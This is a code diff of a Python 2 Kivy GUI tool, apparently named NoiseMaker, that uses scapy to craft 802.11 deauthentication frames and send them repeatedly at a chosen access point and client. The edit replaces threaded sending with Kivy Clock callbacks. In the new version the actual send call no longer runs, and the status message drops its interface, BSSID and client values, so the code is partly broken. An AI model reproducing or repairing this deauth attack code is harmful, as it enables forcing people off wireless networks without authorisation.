@@ -2,15 +2,14 @@ import sys
 from scapy.all import *
 from dns.rdatatype import NULL
 #from netifaces import interfaces
-
 import threading
-
+import time
 import kivy
 kivy.require("1.9.0")
 from kivy.app import App
 from kivy.uix.floatlayout import FloatLayout
 from kivy.config import Config
-
+from kivy.clock import Clock
 #Set Window size
 Config.set('graphics','height','500')
 Config.set('graphics','width','1000')
@@ -20,10 +19,14 @@ class NoiseMakerFunc(FloatLayout):
     
     def outputPacket (self,sendiface,nssid,client, packet):
         sendp(packet)
-        self.ids.resultOutput.text += ' Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
-        #print 'Deauth sent via: '' to BSSID: '' for Client: '
+        #self.ids.resultOutput.text += ' Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
+        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
         return
-                
+    
+    def outputPrintPacket(self, val2):
+        self.ids.resultOutput.text += ' Deauth sent via: '  ' to BSSID: ' ' for Client: '  "\n"
+        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
+        return        
     
     def SendPacket (self):  
         try:
@@ -35,14 +38,18 @@ class NoiseMakerFunc(FloatLayout):
             conf.verb = 0
             
             packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
-            threads = []
+            #threads = []
             for n in range(int(count)):
                 try:
                     #sendp(packet)
                     #print interfaces()
-                    t = threading.Thread(target=self.outputPacket, args=(conf.iface,nssid,client,packet))
-                    threads.append(t)
-                    t.start()
+                    #t = threading.Thread(target=self.outputPacket, args=(conf.iface,nssid,client,packet))
+                    #s = threading.Thread(target=self.outputPrintPacket, args=(sendiface,nssid,client))
+                    #threads.append(t)
+                    #t.start()
+                    #s.start()
+                    Clock.schedule_once(self.outputPrintPacket)
+
                     #print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                     #self.ids.resultOutput.text = 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                 except Exception, d:
